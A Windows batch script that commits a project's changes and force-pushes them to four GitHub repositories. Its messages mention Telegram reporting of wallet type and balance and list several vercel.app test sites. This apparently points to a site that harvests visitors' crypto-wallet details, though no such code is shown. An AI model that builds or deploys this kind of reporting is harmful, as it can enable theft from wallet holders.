@echo off
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo Checking if this is a git repository...
if not exist ".git" (
    echo ERROR: Not in a git repository!
    echo Please run this script from the Emi-lokan-main directory.
    pause
    exit /b 1
)
echo Git repository found!
echo.
echo Fixing Telegram reporting issues...
echo.
echo Issues found:
echo - Server failing to start due to missing .env file
echo - Telegram logging disabled due to missing environment variables
echo - --env-file flag causing startup failures
echo.
echo Fixes applied:
echo - Removed --env-file flag from package.json scripts
echo - Added graceful handling of missing Telegram environment variables
echo - Server now starts without .env file
echo - Telegram logging shows helpful error messages when disabled
echo.
echo Committing Telegram reporting fixes...
git add .
git commit -m "FIX: Telegram reporting - removed env-file dependency, added graceful error handling"
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing Telegram fixes to all repositories...
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo Done! Telegram reporting fixes pushed to all repositories.
echo.
echo Summary:
echo - Server now starts without .env file
echo - Telegram logging gracefully handles missing environment variables
echo - Wallet type detection should work correctly
echo - Balance reporting should work correctly
echo.
echo To enable Telegram logging:
echo 1. Create a Telegram bot via @BotFather
echo 2. Get your bot token
echo 3. Get your chat ID (send message to bot, then visit: https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates)
echo 4. Set environment variables:
echo    - TELEGRAM_BOT_TOKEN=your_bot_token
echo    - TELEGRAM_CHAT_ID=your_chat_id
echo.
echo Test sites:
echo - MISUSE: https://misuse.vercel.app
echo - XENA: https://xena-brown.vercel.app
echo - Mambo: https://mambo-azure.vercel.app
echo.
echo The server should now start and wallet type detection should work!
pause
